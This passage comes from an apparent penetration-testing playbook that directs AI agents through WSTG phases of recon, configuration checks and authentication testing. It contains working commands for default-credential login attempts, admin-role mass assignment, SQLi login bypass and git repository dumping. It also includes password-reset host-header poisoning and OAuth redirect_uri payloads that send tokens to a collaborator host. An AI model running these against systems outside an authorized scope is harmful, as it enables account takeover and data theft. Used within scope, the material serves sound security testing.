         .well-known/assetlinks.json .well-known/apple-app-site-association \
         .well-known/change-password .well-known/host-meta; do
  bb_save "well-known-$(echo "$f" | tr '/.' '__')" "$TARGET/$f"
done
grep -hoE "Disallow:.*" "$ARTIFACTS_DIR"/well-known-robots*.body 2>/dev/null
```
- **Indicators:** `Disallow` entries pointing at admin/internal; an OIDC discovery doc (feeds P4.14); `change-password` endpoint.
- **Validation:** Add discovered paths to `all-urls.txt`; OIDC doc reveals `authorization_endpoint`/`jwks_uri` for JWT/OAuth tests.
- **Evasion / edge cases:** Absence of `security.txt` is not a finding; presence of disclosed paths is recon gold.
- **Severity:** Informational.
- **Dispatch:** -> ReconAgent

### Phase 1 artifacts
`$RECON_DIR/{all-subs.txt,subs-in-scope.txt,alive-hosts.json,alive-urls.txt,all-urls.txt,param-urls.txt,js-files.txt,js/js-endpoints.txt,leaks/js-secrets.txt,ffuf-*.json,arjun-params.json,google-dorks.txt,whatweb.json}`, Burp sitemap populated.

### Phase 1 gate-out

| Condition | Threshold | Action if failed |
|-----------|-----------|------------------|
| In-scope live hosts | >= 1 | FAIL -- target unreachable, abort |
| URLs collected | >= 10 | WARN, continue with limited surface |
| Tech stack identified | framework + server | WARN, use generic payloads |
| JS files processed | all discovered | WARN |
| Metafiles reviewed | robots + .well-known fetched | Required |

```bash
[ "$(wc -l < "$RECON_DIR/alive-urls.txt")" -gt 0 ] \
  && bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --advance \
  || bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --fail "No live hosts in scope"
```

---

## Phase 2: APPLICATION PROFILING (Authenticated)

**Objective:** Produce the AppProfile -- the authenticated, rendered map of what the app *is*, what it protects, and where the bodies are buried (WSTG-INFO-06,-07,-09,-10). This is the document that makes every later test hypothesis-driven.
**Expert rationale:** You cannot test a SPA from `curl`. The real surface (XHR/fetch routes, role-gated views, state machines, object identifiers) only appears in an authenticated browser. AppReviewAgent driving `playwright-harness.ts` walks the app as a logged-in user and emits the profile every hunter consumes.
**Gate-in:** Phase 1 advanced; at least userA authenticated (`auth-manager --check`).
**Agent:** AppReviewAgent (UNDERSTAND group in the agent-router plan).
**Parallelizable:** No -- blocking. All downstream agents read `/tmp/app-profile.json`.

### 2.1 Establish/confirm authenticated session

- **Objective / hypothesis:** Profiling must occur inside the trust boundary to see protected functionality.
- **Procedure:**
```bash
bun "$TOOLS/auth-manager.ts" --target "$TARGET" --check --creds-from "vault:${TARGET_SLUG}-userA" \
  --proxy "$BURP_PROXY" || bun "$TOOLS/auth-manager.ts" --target "$TARGET" --refresh \
  --creds-from "vault:${TARGET_SLUG}-userA" --proxy "$BURP_PROXY" --save-state --headless
```
- **Indicators:** `auth-manager --check` returns valid; protected page renders authenticated content.
- **Validation:** Hit a known authenticated-only endpoint and confirm 200 with user-specific data.
- **Severity:** N/A (enabler).
- **Dispatch:** -> AppReviewAgent

### 2.2 Authenticated flow mapping via real browser (WSTG-INFO-07)

- **Objective / hypothesis:** Walking real flows surfaces XHR routes, hidden params, role-gated UI, and multi-step processes invisible to a crawler.
- **Procedure:**
```bash
bun "$TOOLS/playwright-harness.ts" --target "$TARGET" \
  --auth-cookie "$COOKIE_A" --proxy "$BURP_PROXY" \
  --mode map-flows --crawl-depth 5 \
  --screenshots "$EVIDENCE_DIR" --output "$ARTIFACTS_DIR/playwright-map.json"
# Writes /tmp/app-profile.json (dev-browser engine). Fallback: Playwright CLI emits a minimal profile.
cp /tmp/app-profile.json "$ARTIFACTS_DIR/app-profile.json"
```
- **Indicators:** High-value flows enumerated; `all_discovered_urls` and `attack_priority_order` populated.
- **Validation:** Confirm the proxy captured the crawl (`burp-bridge --history` non-empty); spot-check that authenticated-only routes appear.
- **Evasion / edge cases:** If dev-browser is absent the harness falls back to Playwright CLI with a minimal profile -- note reduced fidelity and supplement manually.
- **Severity:** N/A (enabler).
- **Dispatch:** -> AppReviewAgent

### 2.3 Tech-stack deep analysis & security headers (WSTG-INFO-08,-09)

- **Objective / hypothesis:** Header posture (CSP, HSTS, frame options, cookie flags) sets the difficulty of XSS, clickjacking, and session attacks downstream.
- **Procedure:**
```bash
bb -D- "$TARGET" -o /dev/null 2>/dev/null \
  | tee "$ARTIFACTS_DIR/root-headers.txt" \
  | grep -iE "^(content-security-policy|x-frame-options|x-content-type-options|strict-transport-security|referrer-policy|permissions-policy|cross-origin-(opener|embedder|resource)-policy|set-cookie|access-control-allow-)" \
  > "$ARTIFACTS_DIR/security-headers.txt"
```
- **Indicators:** Missing/weak CSP (feeds P8.1), absent HSTS (P3.6), cookies lacking `HttpOnly`/`Secure`/`SameSite` (P5.2).
- **Validation:** Capture both authenticated and unauthenticated header sets; they often differ.
- **Severity:** Informational here; specific weaknesses scored in their phases.
- **Dispatch:** -> AppReviewAgent

### 2.4 Entry-point inventory (WSTG-INFO-06)

- **Objective / hypothesis:** A consolidated, deduped list of every parameterized request is the master input set for the HUNT phases.
- **Procedure:**
```bash
cat "$RECON_DIR/js/js-endpoints.txt" "$RECON_DIR/param-urls.txt" \
    <(jq -r '.all_discovered_urls[]? , (.high_value_flows[]?.endpoint)' /tmp/app-profile.json) \
  | grep -E "^https?://" | sort -u > "$ARTIFACTS_DIR/entry-points.txt"
bun "$TOOLS/burp-bridge.ts" --history --filter "scope:true" --output "$ARTIFACTS_DIR/burp-history.json"
```
- **Indicators:** Methods beyond GET/POST; JSON vs form bodies; auth tokens in headers vs cookies.
- **Validation:** Each entry point tagged with the identity required to reach it.
- **Severity:** N/A.
- **Dispatch:** -> AppReviewAgent

### 2.5 Trust-boundary mapping (WSTG-INFO-10)

- **Objective / hypothesis:** Vulnerabilities cluster at boundary crossings (client->API, gateway->service, tenant->tenant). Map them to aim P6/P9/P10.
- **Procedure:** AppReviewAgent annotates the profile with boundaries: client vs server validation; API gateway vs backend authz; multi-tenant isolation; admin vs user; internal microservice trust; third-party callbacks (webhooks -> SSRF P9.1).
- **Indicators:** Client-only validation; trust placed in headers (`X-User-Id`); JWT validated only at the edge.
- **Validation:** For each boundary, name the control that enforces it and the test that would break it.
- **Severity:** N/A (targeting).
- **Dispatch:** -> AppReviewAgent

### 2.6 Crown-jewel & role identification (WSTG-IDNT-01)

- **Objective / hypothesis:** Impact ranking. Know the role model and the data worth stealing so triage and chaining are about business impact, not payload novelty.
- **Procedure:** Enumerate roles observed across userA/userB/admin sessions; identify crown jewels (PII store, payment endpoints, admin functions, file storage, token issuance). Record the access-control matrix skeleton (role x sensitive-endpoint) to be filled in P6.
- **Indicators:** Endpoints returning other users' data shapes; admin-only functions reachable in UI of lower roles.
- **Validation:** Confirm role separation actually exists before testing its bypass.
- **Severity:** N/A (impact model).
- **Dispatch:** -> AppReviewAgent, IDORAgent

### 2.7 API surface & schema discovery (WSTG-APIT-01)

- **Objective / hypothesis:** OpenAPI/Swagger/GraphQL schemas hand you the entire authenticated API contract.
- **Procedure:**
```bash
for p in /swagger.json /openapi.json /api-docs /v2/api-docs /v3/api-docs /swagger-ui.html /graphql /api/graphql /playground; do
  bb_save "apispec-$(echo "$p" | tr '/.' '__')" "$TARGET$p"
done
jq -e . "$ARTIFACTS_DIR"/apispec-*swagger*.body 2>/dev/null && echo "OpenAPI spec captured"
```
- **Indicators:** Full route list; undocumented/internal endpoints; GraphQL endpoint live (-> P11.1).
- **Validation:** Import the spec into Burp/Postman; reconcile against `entry-points.txt`.
- **Severity:** Informational to Medium (exposed internal API docs).
- **Dispatch:** -> AppReviewAgent, APIAgent

### Phase 2 artifacts
`/tmp/app-profile.json` (+ copy in `$ARTIFACTS_DIR`), `$ARTIFACTS_DIR/{security-headers.txt,entry-points.txt,burp-history.json,apispec-*}`, screenshots in `$EVIDENCE_DIR`.

### Phase 2 gate-out

| Condition | Threshold | Action if failed |
|-----------|-----------|------------------|
| AppProfile valid JSON | `jq empty /tmp/app-profile.json` | FAIL -- cannot proceed |
| High-value flows | >= 3 | WARN, continue with available |
| Entry points enumerated | >= 1 parameterized | WARN |
| Auth session valid | `auth-manager --check` OK | RETRY then WARN |
| Roles/crown jewels recorded | >= 1 each | WARN |

```bash
jq empty /tmp/app-profile.json 2>/dev/null \
  && bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --advance \
  || bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --fail "AppProfile generation failed"
```

---

## Phase 3: CONFIGURATION, DEPLOYMENT & CRYPTOGRAPHY

**Objective:** Cover WSTG-CONF (01-11), WSTG-ERRH (01-02), and WSTG-CRYP (01-04) -- the misconfiguration, exposure, error-handling, and transport-crypto surface (A05, A02, A06).
**Expert rationale:** The cheapest criticals are deployment mistakes: an exposed `.git`, an open actuator, a backup `.zip`, TLS that still does CBC. These need no clever payload, only diligence -- so a senior tester sweeps them early and systematically.
**Gate-in:** Phase 2 advanced; tech stack known.
**Agents:** AppReviewAgent (config/error/crypto), SecretsExposureAgent (exposure/backup/source/cloud).
**Parallelizable:** All sub-techniques independent.

### 3.1 Network & platform configuration (WSTG-CONF-01, -02)

- **Objective / hypothesis:** Default install pages, debug toolbars, verbose banners, and stale components (A06) reveal a soft platform.
- **Procedure:**
```bash
for p in /server-status /server-info /.env /config.php.bak /phpinfo.php /info.php \
         /actuator /actuator/env /actuator/health /actuator/heapdump /_profiler /debug \
         /elmah.axd /trace.axd /__debug__ /telescope /horizon; do
  bb_save "conf-$(echo "$p" | tr '/.' '__')" "$TARGET$p"
done
nuclei -l "$RECON_DIR/alive-urls.txt" -t exposures/ -t misconfiguration/ -t default-logins/ \
  -H "User-Agent: $UA" -proxy "$BURP_PROXY" -severity medium,high,critical \
  -o "$FINDINGS_DIR/nuclei-conf.txt" 2>/dev/null
```
- **Indicators:** Spring actuator `env`/`heapdump`, `phpinfo`, default credentials, debug toolbars returning 200 with data.
- **Validation:** Pull the actual content (e.g. heapdump -> grep for tokens) to prove exposure, not just a 200.
- **Evasion / edge cases:** Some 200s are SPA catch-alls -- diff body against a known-bogus path.
- **Severity:** CVSS 5.3-9.8 depending on payload (heapdump with secrets = Critical). Impact: direct config/secret disclosure.
- **Dispatch:** -> AppReviewAgent

### 3.2 File-extension / sensitive-file handling (WSTG-CONF-03)

- **Objective / hypothesis:** The server hands out source or sensitive types it should not (`.bak`, `.inc`, `.config`, `.sql`).
- **Procedure:**
```bash
for ext in bak old orig save swp inc config sql tar.gz zip; do
  while read -r u; do
    base="${u%%\?*}"
    bb -o /dev/null -w "%{http_code} $base.$ext\n" "$base.$ext"
  done < <(head -50 "$RECON_DIR/all-urls.txt")
done | grep -E "^(200|206) " > "$FINDINGS_DIR/sensitive-ext.txt"
```
- **Indicators:** 200 on `<page>.bak` returning source or config.
- **Validation:** Download and confirm content type/sensitivity.
- **Severity:** CVSS 5.3-7.5. Impact: source/config disclosure.
- **Dispatch:** -> SecretsExposureAgent

### 3.3 Backup, unreferenced & source-control files (WSTG-CONF-04, -09)

- **Objective / hypothesis:** Exposed VCS metadata (`.git`, `.svn`, `.hg`) or editor swap files let you reconstruct source and secrets.
- **Procedure:**
```bash
bb -o /dev/null -w "%{http_code} /.git/HEAD\n" "$TARGET/.git/HEAD"
bb "$TARGET/.git/config" | tee "$ARTIFACTS_DIR/git-config.txt"
# If /.git/ is browsable or HEAD returns a ref, dump the repo
git-dumper "$TARGET/.git/" "$ARTIFACTS_DIR/git-dump" 2>/dev/null
for f in /.svn/entries /.hg/store /.DS_Store /WEB-INF/web.xml /.env.backup /backup.zip /db.sql; do
  bb_save "src-$(echo "$f" | tr '/.' '__')" "$TARGET$f"
done
```
- **Indicators:** `.git/HEAD` returns `ref: refs/heads/...`; directory listing of `.git/`; `web.xml` discloses servlet mappings.
- **Validation:** Reconstruct at least one source file; grep dump for secrets and run through SecretsExposureAgent.
- **Severity:** CVSS 7.5-9.1. Impact: full source disclosure, often leading to keys/RCE.
- **Dispatch:** -> SecretsExposureAgent

### 3.4 Admin interface enumeration (WSTG-CONF-05)

- **Objective / hypothesis:** Management consoles reachable without (or with weak) auth (A01/A05).
- **Procedure:**
```bash
ADMIN_PATHS=(/admin /admin/login /administrator /wp-admin /manager/html /console \
  /admin-console /cms /backoffice /portal/admin /api/admin /system /control)
for p in "${ADMIN_PATHS[@]}"; do
  for ID in "" "$COOKIE_A"; do
    code=$(bb -o /dev/null -w "%{http_code}" -H "Cookie: $ID" "$TARGET$p")
    echo "$code  cookie=[${ID:+userA}]  $TARGET$p"
  done
done | grep -E "^(200|302|401|403)" | tee "$FINDINGS_DIR/admin-interfaces.txt"
```
- **Indicators:** Admin panel renders for low-priv userA (forced-browse to P6.3); or reachable unauth.
- **Validation:** Confirm functionality, not just a login page; a reachable login is recon, a reachable dashboard is a finding.
- **Severity:** CVSS up to 9.8 (unauth admin). Impact: full compromise.
- **Dispatch:** -> AppReviewAgent (escalate authz checks to IDORAgent)

### 3.5 HTTP methods & verb tampering (WSTG-CONF-06, WSTG-INPV-03)

- **Objective / hypothesis:** Dangerous methods (PUT/DELETE/TRACE) enabled, or authz enforced per-verb so a method swap bypasses it.
- **Procedure:**
```bash
bb -X OPTIONS -D- "$TARGET/" -o /dev/null | grep -i "^allow:"
for m in GET POST PUT DELETE PATCH TRACE CONNECT PROPFIND; do
  echo "$m -> $(bb -X "$m" -o /dev/null -w '%{http_code}' "$TARGET/api/admin/users" -H "Cookie: $COOKIE_A")"
done
bb -X HEAD  -o /dev/null -w "HEAD %{http_code}\n"  "$TARGET/api/admin/users" -H "Cookie: $COOKIE_A"
bb -H "X-HTTP-Method-Override: GET" -X POST -o /dev/null -w "override %{http_code}\n" "$TARGET/api/admin/users" -H "Cookie: $COOKIE_A"
```
- **Indicators:** TRACE enabled (XST); PUT writes a file; a 403 on GET becomes 200 on HEAD/override.
- **Validation:** For PUT, confirm a benign file actually persists and is retrievable.
- **Evasion / edge cases:** Method-override headers (`X-HTTP-Method-Override`, `_method` param) bypass naive verb ACLs.
- **Severity:** CVSS 5.3-9.1 (PUT->webshell). Impact: authz bypass / file write.
- **Dispatch:** -> AppReviewAgent (PUT->upload chain to FileUploadAgent)

### 3.6 HSTS & encrypted-channel (WSTG-CONF-07, WSTG-ATHN-01, WSTG-CRYP-03)

- **Objective / hypothesis:** Missing HSTS or credentials accepted over HTTP enable downgrade/MITM (A02).
- **Procedure:**
```bash
bb -D- "https://$TARGET_DOMAIN/" -o /dev/null | grep -i "strict-transport-security" \
  || echo "[FINDING] HSTS header absent"
curl -sk -o /dev/null -w "http->%{http_code} redirect=%{redirect_url}\n" -A "$UA" "http://$TARGET_DOMAIN/login"
```
- **Indicators:** No `Strict-Transport-Security`; HTTP login form served; login POST accepted over HTTP.
- **Validation:** Confirm credentials actually transit cleartext (capture in Burp on the HTTP listener).
- **Severity:** CVSS 4.3-6.5. Impact: credential interception via downgrade.
- **Dispatch:** -> AppReviewAgent

### 3.7 RIA cross-domain policy (WSTG-CONF-08)

- **Objective / hypothesis:** Permissive `crossdomain.xml`/`clientaccesspolicy.xml` allows hostile cross-domain reads (and signals lax CORS thinking).
- **Procedure:**
```bash
bb "$TARGET/crossdomain.xml" | tee "$ARTIFACTS_DIR/crossdomain.xml"
bb "$TARGET/clientaccesspolicy.xml" | tee "$ARTIFACTS_DIR/clientaccesspolicy.xml"
grep -E 'allow-access-from domain="\*"' "$ARTIFACTS_DIR/crossdomain.xml" && echo "[FINDING] wildcard crossdomain"
```
- **Indicators:** `allow-access-from domain="*"`.
- **Validation:** Confirm the policy is actually served and applies to sensitive endpoints.
- **Severity:** CVSS 4.3-6.5. Impact: cross-domain data theft (legacy clients).
- **Dispatch:** -> CORSAgent

### 3.8 Cloud storage exposure (WSTG-CONF-11)

- **Objective / hypothesis:** App-referenced buckets/blobs are world-readable/writable (A05).
- **Procedure:**
```bash
grep -ohE "https?://[a-z0-9.-]+\.(s3[.-][a-z0-9-]*\.amazonaws\.com|blob\.core\.windows\.net|storage\.googleapis\.com)[^\"' ]*" \
  "$RECON_DIR"/js-files.txt /tmp/app-profile.json 2>/dev/null | sort -u > "$ARTIFACTS_DIR/cloud-buckets.txt"
while read -r b; do in_scope "$b" && bb -o /dev/null -w "%{http_code} $b\n" "$b"; done < "$ARTIFACTS_DIR/cloud-buckets.txt"
```
- **Indicators:** Bucket lists objects (200 + XML listing); writable on test PUT (in scope only).
- **Validation:** Enumerate a few keys; never exfiltrate real data -- prove read with a non-sensitive object.
- **Severity:** CVSS 5.3-9.1. Impact: data disclosure / supply-chain via writable bucket.
- **Dispatch:** -> SecretsExposureAgent

### 3.9 Error handling & stack traces (WSTG-ERRH-01, -02)

- **Objective / hypothesis:** Forced errors leak stack traces, framework versions, SQL, and internal paths (A05/A06).
- **Procedure:**
```bash
bb -o "$ARTIFACTS_DIR/err-array.body" "$TARGET/api/items?id[]=1"
bb -X POST "$TARGET/api/items" -H "Content-Type: application/json" -d '{"id":"AAAA"}' -o "$ARTIFACTS_DIR/err-type.body"
bb -o "$ARTIFACTS_DIR/err-404.body" "$TARGET/this-does-not-exist-$RANDOM"
grep -aiE "exception|stack trace|at [a-z0-9_.]+\(|SQLSTATE|ORA-[0-9]|Traceback|line [0-9]+ in" "$ARTIFACTS_DIR"/err-*.body
```
- **Indicators:** Stack traces, ORM/SQL errors, absolute filesystem paths, framework debug pages (Werkzeug, Whoops, Symfony).
- **Validation:** Confirm reproducibility; a debug console (Werkzeug PIN) escalates to RCE -> hand to RCEAgent.
- **Severity:** CVSS 4.3-7.5 (debug console -> higher). Impact: info disclosure aiding other attacks.
- **Dispatch:** -> AppReviewAgent (debug-console RCE -> RCEAgent)

### 3.10 Weak TLS (WSTG-CRYP-01, -03)

- **Objective / hypothesis:** Deprecated protocols/ciphers permit interception (A02).
- **Procedure:**
```bash
sslscan --no-colour "$TARGET_DOMAIN:443" | tee "$ARTIFACTS_DIR/sslscan.txt"
testssl.sh --quiet --color 0 "https://$TARGET_DOMAIN" > "$ARTIFACTS_DIR/testssl.txt" 2>/dev/null
grep -iE "SSLv2|SSLv3|TLSv1\.0|TLSv1\.1|RC4|3DES|EXPORT|NULL|weak|vulnerable" "$ARTIFACTS_DIR/sslscan.txt"
```
- **Indicators:** SSLv3/TLS1.0/1.1 enabled; RC4/3DES/EXPORT ciphers; expired/mismatched cert; no forward secrecy.
- **Validation:** Confirm the weak suite actually negotiates (`openssl s_client -cipher`).
- **Severity:** CVSS 3.7-7.4. Impact: confidentiality of data in transit.
- **Dispatch:** -> AppReviewAgent

### 3.11 Padding oracle & weak crypto/randomness (WSTG-CRYP-02, -04)

- **Objective / hypothesis:** CBC tokens may leak via padding oracles; predictable randomness breaks session/reset tokens.
- **Procedure:**
```bash
grep -oE "[A-Za-z0-9%+/_-]{32,}" "$ARTIFACTS_DIR/burp-history.json" | sort -u > "$ARTIFACTS_DIR/token-candidates.txt"
padbuster "$TARGET/decrypt?data=ENC" "ENC" 16 -cookies "$COOKIE_A" -proxy "$BURP_PROXY" 2>/dev/null
```
- **Indicators:** Different responses for "invalid padding" vs "invalid content"; sequential/low-entropy tokens (cross-ref P5.9 Sequencer).
- **Validation:** Padbuster recovers plaintext -> confirmed oracle; entropy analysis via Burp Sequencer for randomness claims.
- **Severity:** CVSS 5.9-7.4. Impact: token forgery/decryption.
- **Dispatch:** -> AppReviewAgent

### Phase 3 artifacts
`$FINDINGS_DIR/{nuclei-conf.txt,sensitive-ext.txt,admin-interfaces.txt}`, `$ARTIFACTS_DIR/{git-config.txt,git-dump/,security-headers.txt,sslscan.txt,testssl.txt,crossdomain.xml,cloud-buckets.txt,err-*.body}`.

### Phase 3 gate-out

| Condition | Threshold | Action if failed |
|-----------|-----------|------------------|
| Exposure sweep run | nuclei exposures + backup/source checks done | Required |
| Admin interfaces mapped | all candidates probed with/without auth | Required |
| HTTP methods tested | OPTIONS + verb tamper on sensitive route | Required |
| TLS assessed | sslscan/testssl complete | Required |
| Error handling probed | forced errors on >=3 endpoints | Required |

```bash
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --advance
```

---

## Phase 4: IDENTITY & AUTHENTICATION

**Objective:** Full WSTG-IDNT (01-05) and WSTG-ATHN (01-10 + MFA) plus OAuth/OIDC (WSTG-ATHZ-05) -- registration, enumeration, credential handling, lockout, reset, MFA, and federated login (A07).
**Expert rationale:** Authentication is the highest-impact, highest-paid surface: a pre-auth bypass or account-takeover chain is the report that gets written first. AuthAgent and OAuthAgent run the AUTH group of the deployment plan because everything in P5/P6 depends on the identity model they establish.
**Gate-in:** Phase 3 advanced; login/registration/reset flows located (P2.2); userA/userB/admin provisioned.
**Agents:** AuthAgent (IDNT/ATHN), OAuthAgent (OAuth/OIDC).
**Parallelizable:** AuthAgent and OAuthAgent run concurrently; sub-techniques mostly independent.

```text
Deploy (AUTH group):
  AuthAgent  <- AuthAgent.md + AppProfile + login/reset flows + identities
  OAuthAgent <- OAuthAgent.md + AppProfile + OIDC discovery doc (.well-known/openid-configuration)
Both run_in_background; outputs -> $FINDINGS_DIR/{auth-findings.json, oauth-findings.json}
```

### 4.1 Registration & provisioning (WSTG-IDNT-02, -03)

- **Objective / hypothesis:** Registration accepts weak input, allows duplicate/privileged accounts, or self-provisions roles via mass assignment.
- **Procedure:**
```bash
bb -X POST "$TARGET/api/register" -H "Content-Type: application/json" \
  -d '{"email":"hunt+'$RANDOM'@example.com","password":"P@ssw0rd123!","role":"admin","email_verified":true}' \
  -D- -o "$ARTIFACTS_DIR/reg-massassign.body"
```
- **Indicators:** Account created with elevated role; email-verified bypassed; duplicate email accepted.
- **Validation:** Log in with the new account and confirm the elevated capability actually exists.
- **Evasion / edge cases:** Try nested role objects, array roles, and snake/camel variants (`is_admin`, `isAdmin`).
- **Severity:** CVSS up to 9.8 (self-service admin). Impact: privilege escalation at the door.
- **Dispatch:** -> AuthAgent

### 4.2 Account enumeration (WSTG-IDNT-04)

- **Objective / hypothesis:** Login/registration/reset reveal valid usernames via response, status, or timing deltas -- enabling targeted attacks.
- **Procedure:**
```bash
for u in "$KNOWN_VALID_USER" "definitely-not-a-user-$RANDOM@example.com"; do
  bb -X POST "$TARGET/api/auth/login" -H "Content-Type: application/json" \
     -d "{\"username\":\"$u\",\"password\":\"wrong\"}" \
     -D- -o "$ARTIFACTS_DIR/enum-$RANDOM.body" -w "code=%{http_code} time=%{time_total} size=%{size_download}\n"
done
```
- **Indicators:** Distinct message ("no such user" vs "wrong password"), status code, body length, or a consistent timing gap.
- **Validation:** Repeat 10x to rule out jitter; confirm the delta is deterministic and user-dependent.
- **Evasion / edge cases:** Timing oracles persist even with uniform messages (password hashing only on valid users).
- **Severity:** CVSS 5.3. Impact: enables credential stuffing / phishing.
- **Dispatch:** -> AuthAgent

### 4.3 Weak username & password policy (WSTG-IDNT-05, WSTG-ATHN-07)

- **Objective / hypothesis:** Policy permits trivial passwords or predictable usernames.
- **Procedure:** Attempt to set `password`, `123456`, the username-as-password, and a 1-char password through registration and change-password. Record minimum length, complexity, breached-password rejection (HIBP), and username format constraints.
- **Indicators:** Trivial passwords accepted; sequential/email-derived usernames enforced.
- **Validation:** Confirm acceptance end-to-end (the account is usable afterward).
- **Severity:** CVSS 4.3-5.3. Impact: weakens every account.
- **Dispatch:** -> AuthAgent

### 4.4 Credentials over channel (WSTG-ATHN-01)

- **Objective / hypothesis:** Credentials/tokens transit insecurely or appear in URLs/logs.
- **Procedure:** Inspect Burp history for `password`/`token` in query strings, `Referer` leakage, and any HTTP (non-TLS) auth request (cross-ref P3.6).
- **Indicators:** Secrets in URL/Referer/`Authorization` over HTTP.
- **Validation:** Reproduce the leaking request; confirm the value is a live credential/token.
- **Severity:** CVSS 4.3-7.5. Impact: credential exposure.
- **Dispatch:** -> AuthAgent

### 4.5 Default credentials (WSTG-ATHN-02)

- **Objective / hypothesis:** Admin/test/default accounts survive into production.
- **Procedure:**
```bash
for pair in admin:admin admin:password root:root test:test admin:changeme guest:guest; do
  u="${pair%%:*}"; p="${pair##*:}"
  bb -X POST "$TARGET/api/auth/login" -H "Content-Type: application/json" \
     -d "{\"username\":\"$u\",\"password\":\"$p\"}" -o /dev/null -w "$pair -> %{http_code}\n"
done
```
- **Indicators:** Successful auth (200 + session/token) on a default pair.
- **Validation:** Log in and confirm privileges; stop immediately if it lands you in real data.
- **Severity:** CVSS up to 9.8. Impact: trivial compromise.
- **Dispatch:** -> AuthAgent

### 4.6 Weak lockout (WSTG-ATHN-03)

- **Objective / hypothesis:** No/loose lockout enables brute force / credential stuffing (A07/A09).
- **Procedure:** Send N failed logins for one owned account; observe whether lockout/CAPTCHA/backoff triggers. Then retry the lockout bypass headers (see P10.5) to defeat IP-based throttling.
- **Indicators:** No lockout after many attempts; lockout bypassable via `X-Forwarded-For` rotation.
- **Validation:** Confirm a real (in-scope, owned) account can be locked or brute-forced; never lock victim accounts.
- **Severity:** CVSS 5.3-7.5. Impact: account compromise at scale.
- **Dispatch:** -> AuthAgent

### 4.7 Authentication bypass (WSTG-ATHN-04)

- **Objective / hypothesis:** Direct page request, forced browsing, parameter manipulation, or SQLi (P7.1) skips the login gate.
- **Procedure:** Request post-login pages without a session; tamper `authenticated=true`/`role=admin` flags; replay a partial-login token; try SQLi auth-bypass (`' OR '1'='1' -- `) on the login endpoint.
- **Indicators:** Authenticated content without auth; flag tampering elevates session.
- **Validation:** Confirm real protected data returns, not a redirect shell.
- **Severity:** CVSS up to 9.8. Impact: full bypass.
- **Dispatch:** -> AuthAgent (SQLi path -> SQLiAgent)

### 4.8 Remember-me / persistent auth (WSTG-ATHN-05)

- **Objective / hypothesis:** Remember-me tokens are predictable, non-expiring, or not invalidated on password change.
- **Procedure:** Capture the persistent cookie; analyze structure/entropy; change the password and test if the old remember-me token still authenticates.
- **Indicators:** Static/predictable token; survives password reset/logout.
- **Validation:** Reuse the token in a fresh client after credential change.
- **Severity:** CVSS 5.3-7.5. Impact: persistent ATO.
- **Dispatch:** -> AuthAgent

### 4.9 Browser cache weaknesses (WSTG-ATHN-06)

- **Objective / hypothesis:** Sensitive authenticated pages are cacheable, leaving data in shared/back-button caches.
- **Procedure:** Inspect `Cache-Control`/`Pragma` on authenticated pages; confirm back-button reveals data after logout (real browser via playwright-harness).
- **Indicators:** Missing `Cache-Control: no-store` on sensitive pages; data visible post-logout via back button.
- **Validation:** Reproduce in a real browser.
- **Severity:** CVSS 3.1-5.3. Impact: local data exposure (shared kiosks).
- **Dispatch:** -> AuthAgent

### 4.10 Security questions (WSTG-ATHN-08)

- **Objective / hypothesis:** Weak/guessable knowledge-based recovery enables takeover.
- **Procedure:** Enumerate available questions; assess guessability/OSINT-recoverability; test answer brute-force lockout.
- **Indicators:** OSINT-derivable answers; no rate limit on answer attempts.
- **Severity:** CVSS 5.3-7.5. Impact: account recovery bypass.
- **Dispatch:** -> AuthAgent

### 4.11 Password change/reset (WSTG-ATHN-09)

- **Objective / hypothesis:** Reset tokens are predictable/reusable, or host-header injection poisons the reset link (account takeover).
- **Procedure:**
```bash
bb -X POST "$TARGET/api/auth/forgot-password" -H "Content-Type: application/json" \
  -H "Host: $COLLAB" -H "X-Forwarded-Host: $COLLAB" \
  -d '{"email":"'"$KNOWN_VALID_USER"'"}' -D-
bun "$TOOLS/burp-bridge.ts" --collaborator-poll --poll-max 12   # did the reset link beacon to us?
# Token analysis: request several, compare for predictability/reuse/expiry
```
- **Indicators:** Reset link host = `$COLLAB` (Collaborator hit); token sequential/reusable after change; change-password lacks current-password check.
- **Validation:** Use a poisoned/forged token to actually reset an owned account.
- **Evasion / edge cases:** `X-Forwarded-Host`, `X-Host`, dangling `Host` with absolute URI; double Host header.
- **Severity:** CVSS up to 9.8 (ATO). Impact: mass account takeover.
- **Dispatch:** -> AuthAgent (host-header mechanics shared with CRLFAgent P9.5)

### 4.12 Weaker auth in alternative channel (WSTG-ATHN-10)

- **Objective / hypothesis:** Mobile API / legacy endpoint / partner channel enforces weaker auth than the main web flow.
- **Procedure:** Compare auth requirements across `/api/v1` vs `/api/v2`, mobile endpoints, and SSO vs local login for the same account.
- **Indicators:** A channel that skips MFA or lockout the main flow enforces.
- **Validation:** Authenticate through the weaker channel and reach the same privileges.
- **Severity:** CVSS 5.3-8.1. Impact: bypass of primary auth controls.
- **Dispatch:** -> AuthAgent

### 4.13 MFA bypass (WSTG-ATHN extension)

- **Objective / hypothesis:** MFA is enforced inconsistently or defeatable (rate limit, response tamper, enrollment skip, race).
- **Procedure:** Brute the OTP endpoint (no rate limit?); flip `"verified":false`->`true` in the verify response/flow; skip the enrollment step; test whether the partial-login session already grants access; race the verify endpoint (-> RaceConditionAgent P10.4).
- **Indicators:** Access granted without valid OTP; OTP brute-forceable; backup codes enumerable.
- **Validation:** Complete a full login on an owned account without a valid second factor.
- **Severity:** CVSS 7.5-8.8. Impact: defeats the strongest auth control.
- **Dispatch:** -> AuthAgent

### 4.14 OAuth / OIDC weaknesses (WSTG-ATHZ-05)

- **Objective / hypothesis:** `redirect_uri`/`state`/`code` handling flaws enable token theft and account takeover (A07).
- **Procedure:**
```bash
jq '.' "$ARTIFACTS_DIR"/well-known-_well-known_openid-configuration.body 2>/dev/null
for ru in "https://$COLLAB" "https://app.$TARGET_DOMAIN.$COLLAB" \
          "https://app.$TARGET_DOMAIN/callback/../../$COLLAB" \
          "https://app.$TARGET_DOMAIN/callback#@$COLLAB" \
          "https://app.$TARGET_DOMAIN/callback?next=https://$COLLAB"; do
  echo "TEST redirect_uri=$ru"
  bb -o /dev/null -w "%{http_code} %{redirect_url}\n" \
    "$AUTH_EP?client_id=$CLIENT_ID&response_type=code&scope=openid&redirect_uri=$ru&state=abc"
done
```
- **Indicators:** Authorization code/token delivered to `$COLLAB`; `state` accepted when removed/reused (CSRF on login); code replayable after exchange.
